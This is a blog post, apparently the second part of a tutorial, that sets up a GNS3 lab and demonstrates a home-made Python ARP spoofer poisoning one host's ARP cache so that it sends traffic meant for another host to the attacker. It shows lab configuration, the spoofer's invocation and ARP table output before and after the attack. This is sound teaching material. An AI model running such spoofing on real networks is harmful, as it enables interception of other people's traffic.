---
layout: post
title: "Write your own ARP Spoofer in Python (part 2/2)"
lead_words: 15
---

In part 1. we've built our spoofer. Now let's build a lab to test it.

## The lab
Our [GNS3](https://gns3.com/) lab is as simple as possible for our needs:

![arp]({{ "/assets/arp_spoofing_lab.png" | relative_url }})

Where:

**SW** is just a [GNS built in switch](https://docs.gns3.com/1aQSkL4KyIh-3j-UCeuukj4Wg1VJ7uI-vwcewaUHbjbU/index.html#h.wgecv333sdvm), as no configuration (vlans etc.) is required for our lab.

**Attacker** is a box created with [Python, Go, Perl, PHP appliance](https://gns3.com/marketplace/appliance/python-go-perl-php), so we do not have to install/configure Python 3.

**HOST_A** and **HOST_B** are boxes created with [Alpine Linux appliance](https://gns3.com/marketplace/appliance/alpine-linux-2) as all we need here is to look up an arp cache to verify if attack was successful.

All linux boxes are configured with static ip's for our convenience:

<div class="filename">On 10.10.10.x box</div>
{% highlight bash %}
$ cat /etc/network/interfaces

# Static config for eth0
auto eth0
iface eth0 inet static
	address 10.10.10.x # where 'x' varies on all boxes ofc :)
	netmask 255.255.255.0
{% endhighlight %}

## The attack

As an **Attacker** we will try to impersonate **HOST_B**, so that `A -> B` traffic goes to our machine.

First, let's ping **HOST_B** and **Attacker** from **HOST_A** and look into its arp cache:

<div class="filename">On 'HOST_A' box</div>
{% highlight bash %}
$ ping 10.10.10.11 -c 1
PING 10.10.10.11 (10.10.10.11): 56 data bytes
64 bytes from 10.10.10.11: seq=0 ttl=64 time=0.673 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.673/0.673/0.673 ms

$ ping 10.10.10.12 -c 1
PING 10.10.10.12 (10.10.10.12): 56 data bytes
64 bytes from 10.10.10.12: seq=0 ttl=64 time=0.227 ms

--- 10.10.10.12 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.227/0.227/0.227 ms

$ arp -n
? (10.10.10.12) at 92:01:92:a3:45:be [ether]  on eth0
? (10.10.10.11) at 6e:fc:07:cd:10:9f [ether]  on eth0
{% endhighlight %}

As we can see, mac addresses in the arp table are correct by now.

Now, let's run the spoofer. Our script has the following usage:

<div class="filename">On 'Attacker' box</div>
{% highlight bash %}
$ ./arp_spoofer.py
Usage:
  ./arp_spoofer.py INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
{% endhighlight %}

Interface name on **Attacker** machine is `eth0` (you can check it with `ifconfig`), the host we want to impersonate is **HOST_B** (`10.10.10.11`) and the host which arp cache we are about to poison is **HOST_A** (`10.10.10.10`).

<div class="filename">On 'Attacker' box</div>
{% highlight bash %}
$ ./arp_spoofer.py eth0 10.10.10.11 10.10.10.10
{% endhighlight %}

After we run the above command and let the script send ARP replies to **HOST_A**, its cache should be poisoned. Let's verify that:

<div class="filename">On 'HOST_A' box</div>
{% highlight bash %}
$ arp -n
? (10.10.10.12) at 92:01:92:a3:45:be [ether]  on eth0
? (10.10.10.11) at 92:01:92:a3:45:be [ether]  on eth0
{% endhighlight %}

Voila! an entry for **HOST_B** (`10.10.10.11`) has **Attacker**'s mac address.